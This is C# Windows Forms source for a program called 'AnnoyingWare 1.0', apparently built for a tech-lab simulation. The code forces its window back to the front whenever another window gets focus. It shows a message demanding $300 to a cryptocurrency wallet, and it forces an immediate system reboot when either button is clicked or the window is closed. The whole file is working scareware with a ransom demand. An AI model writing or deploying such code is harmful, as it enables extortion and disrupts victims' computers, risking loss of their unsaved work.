using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LTIIT_TechLabSim
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        bool buttonClicked = false;
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void restartPC()
        {
            System.Diagnostics.Process.Start("Shutdown.exe", "/r /t 00");
            Application.Exit();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string active_window = GetActiveWindowTitle();
            if (active_window != "AnnoyingWare 1.0")
            {
                this.WindowState = FormWindowState.Minimized;
                this.Show();
                this.WindowState = FormWindowState.Maximized;
            } else
            {
                return;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Pay $300 to wallet 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 and I'll stop!", "AnnoyingWare 1.0");
            this.buttonClicked = true;
            restartPC();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("You asked for it!", "AnnoyingWare 1.0");
            this.buttonClicked = true;
            restartPC();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (!this.buttonClicked)
            {
                MessageBox.Show("Nice try, seeeee ya!", "AnnoyingWare 1.0");
                restartPC();
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
